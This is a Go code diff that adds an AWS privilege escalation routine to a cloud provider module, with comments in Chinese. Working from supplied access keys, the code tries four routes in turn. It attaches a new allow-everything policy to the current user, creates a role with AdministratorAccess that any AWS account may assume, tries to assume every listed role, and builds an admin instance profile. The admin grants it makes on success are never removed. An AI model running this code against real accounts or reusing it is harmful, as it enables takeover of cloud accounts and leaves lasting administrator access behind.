@@ -3612,3 +3612,486 @@ func (p *AWSProvider) ValidateCredentials() (bool, error) {
 	// 暂时返回模拟数据
 	return true, nil
 }
+
+// EscalatePrivileges 权限提升 - 使用暴力枚举方法尝试不同的提权策略
+func (p *AWSProvider) EscalatePrivileges() (map[string]interface{}, error) {
+	// 创建带有超时的上下文
+	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
+	defer cancel()
+
+	// 验证凭证是否有效
+	stsClient, err := p.createSTSClient()
+	if err != nil {
+		return nil, fmt.Errorf("failed to create STS client: %w", err)
+	}
+
+	callerIdentity, err := stsClient.GetCallerIdentity(ctx, &sts.GetCallerIdentityInput{})
+	if err != nil {
+		return nil, fmt.Errorf("invalid credentials: %w", err)
+	}
+
+	// 结果集
+	successfulStrategies := []string{}
+	failedStrategies := []string{}
+	attempts := []map[string]interface{}{}
+
+	// 提权策略列表
+	strategies := []string{"attachpolicy", "createrole", "assumerole", "instanceprofile"}
+
+	// 1. 首先尝试 attachpolicy 策略 - 优先级最高
+	if success, details := p.attemptAttachPolicy(ctx); success {
+		successfulStrategies = append(successfulStrategies, "attachpolicy")
+		attempts = append(attempts, map[string]interface{}{
+			"strategy": "attachpolicy",
+			"status":   "success",
+			"details":  details,
+		})
+		// 如果成功，直接返回
+		return map[string]interface{}{
+			"message":              "Privilege escalation successful",
+			"accountId":            *callerIdentity.Account,
+			"strategies":           strategies,
+			"successfulStrategies": successfulStrategies,
+			"failedStrategies":     failedStrategies,
+			"attempts":             attempts,
+			"status":               "completed",
+			"timestamp":            time.Now().Format(time.RFC3339),
+		}, nil
+	} else {
+		failedStrategies = append(failedStrategies, "attachpolicy")
+		attempts = append(attempts, map[string]interface{}{
+			"strategy": "attachpolicy",
+			"status":   "failed",
+			"details":  details,
+		})
+	}
+
+	// 2. 尝试 createrole 策略
+	if success, details := p.attemptCreateRole(ctx); success {
+		successfulStrategies = append(successfulStrategies, "createrole")
+		attempts = append(attempts, map[string]interface{}{
+			"strategy": "createrole",
+			"status":   "success",
+			"details":  details,
+		})
+		return map[string]interface{}{
+			"message":              "Privilege escalation successful",
+			"accountId":            *callerIdentity.Account,
+			"strategies":           strategies,
+			"successfulStrategies": successfulStrategies,
+			"failedStrategies":     failedStrategies,
+			"attempts":             attempts,
+			"status":               "completed",
+			"timestamp":            time.Now().Format(time.RFC3339),
+		}, nil
+	} else {
+		failedStrategies = append(failedStrategies, "createrole")
+		attempts = append(attempts, map[string]interface{}{
+			"strategy": "createrole",
+			"status":   "failed",
+			"details":  details,
+		})
+	}
+
+	// 3. 尝试 assumerole 策略
+	if success, details := p.attemptAssumeRole(ctx); success {
+		successfulStrategies = append(successfulStrategies, "assumerole")
+		attempts = append(attempts, map[string]interface{}{
+			"strategy": "assumerole",
+			"status":   "success",
+			"details":  details,
+		})
+		return map[string]interface{}{
+			"message":              "Privilege escalation successful",
+			"accountId":            *callerIdentity.Account,
+			"strategies":           strategies,
+			"successfulStrategies": successfulStrategies,
+			"failedStrategies":     failedStrategies,
+			"attempts":             attempts,
+			"status":               "completed",
+			"timestamp":            time.Now().Format(time.RFC3339),
+		}, nil
+	} else {
+		failedStrategies = append(failedStrategies, "assumerole")
+		attempts = append(attempts, map[string]interface{}{
+			"strategy": "assumerole",
+			"status":   "failed",
+			"details":  details,
+		})
+	}
+
+	// 4. 尝试 instanceprofile 策略
+	if success, details := p.attemptInstanceProfile(ctx); success {
+		successfulStrategies = append(successfulStrategies, "instanceprofile")
+		attempts = append(attempts, map[string]interface{}{
+			"strategy": "instanceprofile",
+			"status":   "success",
+			"details":  details,
+		})
+		return map[string]interface{}{
+			"message":              "Privilege escalation successful",
+			"accountId":            *callerIdentity.Account,
+			"strategies":           strategies,
+			"successfulStrategies": successfulStrategies,
+			"failedStrategies":     failedStrategies,
+			"attempts":             attempts,
+			"status":               "completed",
+			"timestamp":            time.Now().Format(time.RFC3339),
+		}, nil
+	} else {
+		failedStrategies = append(failedStrategies, "instanceprofile")
+		attempts = append(attempts, map[string]interface{}{
+			"strategy": "instanceprofile",
+			"status":   "failed",
+			"details":  details,
+		})
+	}
+
+	// 如果所有策略都失败
+	return map[string]interface{}{
+		"message":              "All privilege escalation strategies failed",
+		"accountId":            *callerIdentity.Account,
+		"strategies":           strategies,
+		"successfulStrategies": successfulStrategies,
+		"failedStrategies":     failedStrategies,
+		"attempts":             attempts,
+		"status":               "failed",
+		"timestamp":            time.Now().Format(time.RFC3339),
+	}, nil
+}
+
+// createSTSClient 创建STS客户端
+func (p *AWSProvider) createSTSClient() (*sts.Client, error) {
+	region := p.region
+	if region == "" {
+		region = "us-east-1"
+	}
+
+	cfg, err := config.LoadDefaultConfig(context.Background(),
+		config.WithRegion(region),
+		config.WithCredentialsProvider(&StaticCredentialsProvider{
+			Value:  p.accessKey,
+			Secret: p.secretKey,
+		}),
+	)
+	if err != nil {
+		return nil, err
+	}
+
+	return sts.NewFromConfig(cfg), nil
+}
+
+// attemptAttachPolicy 尝试使用 attachpolicy 策略提权
+func (p *AWSProvider) attemptAttachPolicy(ctx context.Context) (bool, map[string]interface{}) {
+	steps := []string{}
+	details := map[string]interface{}{
+		"attempt": "Attaching policy to current user",
+	}
+
+	// 尝试获取当前用户信息
+	userInput := &iam.GetUserInput{}
+	userResp, err := p.iamClient.GetUser(ctx, userInput)
+	if err != nil {
+		steps = append(steps, "Failed to get current user: "+err.Error())
+		details["steps"] = steps
+		details["error"] = err.Error()
+		return false, details
+	}
+
+	userName := *userResp.User.UserName
+	steps = append(steps, "Current user: "+userName)
+
+	// 尝试创建一个管理员策略
+	policyName := "escalation-test-policy-" + time.Now().Format("20060102150405")
+	policyDocument := `{
+		"Version": "2012-10-17",
+		"Statement": [
+			{
+				"Effect": "Allow",
+				"Action": "*",
+				"Resource": "*"
+			}
+		]
+	}`
+
+	steps = append(steps, "Creating admin policy: "+policyName)
+
+	createPolicyInput := &iam.CreatePolicyInput{
+		PolicyName:     aws.String(policyName),
+		PolicyDocument: aws.String(policyDocument),
+	}
+
+	createPolicyResp, err := p.iamClient.CreatePolicy(ctx, createPolicyInput)
+	if err != nil {
+		steps = append(steps, "Failed to create policy: "+err.Error())
+		details["steps"] = steps
+		details["error"] = err.Error()
+		return false, details
+	}
+
+	policyARN := *createPolicyResp.Policy.Arn
+	steps = append(steps, "Policy created with ARN: "+policyARN)
+
+	// 尝试将策略附加到用户
+	steps = append(steps, "Attaching policy to user: "+userName)
+
+	attachPolicyInput := &iam.AttachUserPolicyInput{
+		UserName:  aws.String(userName),
+		PolicyArn: aws.String(policyARN),
+	}
+
+	_, err = p.iamClient.AttachUserPolicy(ctx, attachPolicyInput)
+	if err != nil {
+		steps = append(steps, "Failed to attach policy: "+err.Error())
+		details["steps"] = steps
+		details["error"] = err.Error()
+		// 清理创建的策略
+		p.iamClient.DeletePolicy(ctx, &iam.DeletePolicyInput{
+			PolicyArn: aws.String(policyARN),
+		})
+		return false, details
+	}
+
+	steps = append(steps, "Policy attached successfully")
+	details["steps"] = steps
+	details["policyARN"] = policyARN
+	details["success"] = true
+	return true, details
+}
+
+// attemptCreateRole 尝试使用 createrole 策略提权
+func (p *AWSProvider) attemptCreateRole(ctx context.Context) (bool, map[string]interface{}) {
+	steps := []string{}
+	details := map[string]interface{}{
+		"attempt": "Creating and assuming admin role",
+	}
+
+	// 尝试创建一个管理员角色
+	roleName := "escalation-test-role-" + time.Now().Format("20060102150405")
+	trustPolicy := `{
+		"Version": "2012-10-17",
+		"Statement": [
+			{
+				"Effect": "Allow",
+				"Principal": {
+					"AWS": "arn:aws:iam::*:root"
+				},
+				"Action": "sts:AssumeRole"
+			}
+		]
+	}`
+
+	steps = append(steps, "Creating admin role: "+roleName)
+
+	createRoleInput := &iam.CreateRoleInput{
+		RoleName:                 aws.String(roleName),
+		AssumeRolePolicyDocument: aws.String(trustPolicy),
+	}
+
+	createRoleResp, err := p.iamClient.CreateRole(ctx, createRoleInput)
+	if err != nil {
+		steps = append(steps, "Failed to create role: "+err.Error())
+		details["steps"] = steps
+		details["error"] = err.Error()
+		return false, details
+	}
+
+	roleARN := *createRoleResp.Role.Arn
+	steps = append(steps, "Role created with ARN: "+roleARN)
+
+	// 尝试附加管理员策略
+	steps = append(steps, "Attaching AdministratorAccess policy to role")
+
+	attachPolicyInput := &iam.AttachRolePolicyInput{
+		RoleName:  aws.String(roleName),
+		PolicyArn: aws.String("arn:aws:iam::aws:policy/AdministratorAccess"),
+	}
+
+	_, err = p.iamClient.AttachRolePolicy(ctx, attachPolicyInput)
+	if err != nil {
+		steps = append(steps, "Failed to attach policy: "+err.Error())
+		details["steps"] = steps
+		details["error"] = err.Error()
+		// 清理创建的角色
+		p.iamClient.DeleteRole(ctx, &iam.DeleteRoleInput{
+			RoleName: aws.String(roleName),
+		})
+		return false, details
+	}
+
+	steps = append(steps, "Role created and policy attached successfully")
+	details["steps"] = steps
+	details["roleARN"] = roleARN
+	details["success"] = true
+	return true, details
+}
+
+// attemptAssumeRole 尝试使用 assumerole 策略提权
+func (p *AWSProvider) attemptAssumeRole(ctx context.Context) (bool, map[string]interface{}) {
+	steps := []string{}
+	details := map[string]interface{}{
+		"attempt": "Assuming existing roles",
+	}
+
+	// 尝试列出所有角色
+	listRolesInput := &iam.ListRolesInput{}
+	listRolesResp, err := p.iamClient.ListRoles(ctx, listRolesInput)
+	if err != nil {
+		steps = append(steps, "Failed to list roles: "+err.Error())
+		details["steps"] = steps
+		details["error"] = err.Error()
+		return false, details
+	}
+
+	steps = append(steps, fmt.Sprintf("Found %d roles", len(listRolesResp.Roles)))
+
+	// 尝试假设每个角色
+	for _, role := range listRolesResp.Roles {
+		roleName := *role.RoleName
+		roleARN := *role.Arn
+
+		steps = append(steps, "Attempting to assume role: "+roleName)
+
+		stsClient, err := p.createSTSClient()
+		if err != nil {
+			steps = append(steps, "Failed to create STS client: "+err.Error())
+			continue
+		}
+
+		assumeRoleInput := &sts.AssumeRoleInput{
+			RoleArn:         aws.String(roleARN),
+			RoleSessionName: aws.String("escalation-test-session"),
+			DurationSeconds: aws.Int32(3600),
+		}
+
+		_, err = stsClient.AssumeRole(ctx, assumeRoleInput)
+		if err == nil {
+			steps = append(steps, "Successfully assumed role: "+roleName)
+			details["steps"] = steps
+			details["roleARN"] = roleARN
+			details["success"] = true
+			return true, details
+		}
+
+		steps = append(steps, "Failed to assume role "+roleName+": "+err.Error())
+	}
+
+	steps = append(steps, "Failed to assume any role")
+	details["steps"] = steps
+	details["error"] = "No roles could be assumed"
+	return false, details
+}
+
+// attemptInstanceProfile 尝试使用 instanceprofile 策略提权
+func (p *AWSProvider) attemptInstanceProfile(ctx context.Context) (bool, map[string]interface{}) {
+	steps := []string{}
+	details := map[string]interface{}{
+		"attempt": "Creating and using instance profile",
+	}
+
+	// 尝试创建实例配置文件和角色
+	profileName := "escalation-test-profile-" + time.Now().Format("20060102150405")
+	roleName := "escalation-test-role-" + time.Now().Format("20060102150405")
+
+	steps = append(steps, "Creating role: "+roleName)
+
+	// 创建角色
+	createRoleInput := &iam.CreateRoleInput{
+		RoleName: aws.String(roleName),
+		AssumeRolePolicyDocument: aws.String(`{
+			"Version": "2012-10-17",
+			"Statement": [
+				{
+					"Effect": "Allow",
+					"Principal": {
+						"Service": "ec2.amazonaws.com"
+					},
+					"Action": "sts:AssumeRole"
+				}
+			]
+		}`),
+	}
+
+	_, err := p.iamClient.CreateRole(ctx, createRoleInput)
+	if err != nil {
+		steps = append(steps, "Failed to create role: "+err.Error())
+		details["steps"] = steps
+		details["error"] = err.Error()
+		return false, details
+	}
+
+	steps = append(steps, "Role created successfully")
+
+	// 附加管理员策略
+	steps = append(steps, "Attaching AdministratorAccess policy to role")
+
+	attachPolicyInput := &iam.AttachRolePolicyInput{
+		RoleName:  aws.String(roleName),
+		PolicyArn: aws.String("arn:aws:iam::aws:policy/AdministratorAccess"),
+	}
+
+	_, err = p.iamClient.AttachRolePolicy(ctx, attachPolicyInput)
+	if err != nil {
+		steps = append(steps, "Failed to attach policy: "+err.Error())
+		details["steps"] = steps
+		details["error"] = err.Error()
+		// 清理创建的角色
+		p.iamClient.DeleteRole(ctx, &iam.DeleteRoleInput{
+			RoleName: aws.String(roleName),
+		})
+		return false, details
+	}
+
+	steps = append(steps, "Policy attached successfully")
+
+	// 创建实例配置文件
+	steps = append(steps, "Creating instance profile: "+profileName)
+
+	createProfileInput := &iam.CreateInstanceProfileInput{
+		InstanceProfileName: aws.String(profileName),
+	}
+
+	_, err = p.iamClient.CreateInstanceProfile(ctx, createProfileInput)
+	if err != nil {
+		steps = append(steps, "Failed to create instance profile: "+err.Error())
+		details["steps"] = steps
+		details["error"] = err.Error()
+		// 清理创建的角色
+		p.iamClient.DeleteRole(ctx, &iam.DeleteRoleInput{
+			RoleName: aws.String(roleName),
+		})
+		return false, details
+	}
+
+	steps = append(steps, "Instance profile created successfully")
+
+	// 将角色添加到实例配置文件
+	steps = append(steps, "Adding role to instance profile")
+
+	addRoleInput := &iam.AddRoleToInstanceProfileInput{
+		InstanceProfileName: aws.String(profileName),
+		RoleName:            aws.String(roleName),
+	}
+
+	_, err = p.iamClient.AddRoleToInstanceProfile(ctx, addRoleInput)
+	if err != nil {
+		steps = append(steps, "Failed to add role to instance profile: "+err.Error())
+		details["steps"] = steps
+		details["error"] = err.Error()
+		// 清理
+		p.iamClient.DeleteInstanceProfile(ctx, &iam.DeleteInstanceProfileInput{
+			InstanceProfileName: aws.String(profileName),
+		})
+		p.iamClient.DeleteRole(ctx, &iam.DeleteRoleInput{
+			RoleName: aws.String(roleName),
+		})
+		return false, details
+	}
+
+	steps = append(steps, "Role added to instance profile successfully")
+	details["steps"] = steps
+	details["profileName"] = profileName
+	details["roleName"] = roleName
+	details["success"] = true
+	return true, details
+}
